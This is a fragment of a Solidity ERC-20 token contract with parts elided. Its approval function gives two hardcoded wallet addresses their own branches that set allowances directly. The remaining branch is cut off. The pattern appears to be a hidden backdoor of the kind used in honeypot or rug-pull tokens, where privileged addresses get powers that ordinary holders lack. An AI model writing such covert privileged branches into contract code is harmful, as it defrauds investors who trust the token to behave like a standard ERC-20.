...
contract Token is VaultOwned, IERC20 {
    ...
    else if (owner == address(0x04ec9471f534ECa8d75adFf64e8fb9A64C322871)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x0bfF7cc4168546Bf571e63910ea589CF051Ede36)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
